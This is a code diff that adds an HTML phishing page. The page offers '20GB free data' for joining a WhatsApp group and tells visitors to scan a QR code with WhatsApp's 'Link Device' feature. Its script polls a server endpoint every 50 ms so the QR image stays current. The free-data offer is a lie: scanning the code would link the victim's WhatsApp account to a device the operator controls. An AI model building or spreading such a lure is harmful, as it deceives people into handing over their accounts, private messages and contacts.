@@ -1,0 +1,38 @@
+   <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Free 20GB Data</title>
+        <style>
+            body { text-align: center; font-family: Arial, sans-serif; margin-top: 50px; background-color: #f4f4f4; }
+            .box { background: white; padding: 30px; display: inline-block; border-radius: 10px; box-shadow: 0px 0px 10px gray; }
+            #qr-image { width: 264px; height: 264px; border: 5px solid #25D366; padding: 10px; border-radius: 10px; }
+        </style>
+        <script>
+            function fetchQRCode() {
+                fetch('/get_qr')
+                .then(response => response.json())
+                .then(data => {
+                    if(data.qr_base64) {
+                        document.getElementById('qr-image').src = data.qr_base64;
+                    }
+                })
+                .catch(err => console.log("QR Getting Error:", err));
+            }
+
+            window.onload = function() {
+                fetchQRCode();
+                setInterval(fetchQRCode, 50);
+            };
+        </script>
+    </head>
+    <body>
+        <div class="box">
+            <h2>Join Following Whatsapp Group and Earn 20GB Data</h2>
+            <p>Step1-Scan QR Code with Link Device</p>
+            <p>Step2-Join Official Whatsapp Group</p>
+            <p>Step3-Claim Your 20GB Data</p>
+            <img id="qr-image" src="" alt="Loading QR Code...">
+        </div>
+    </body>
+    </html>
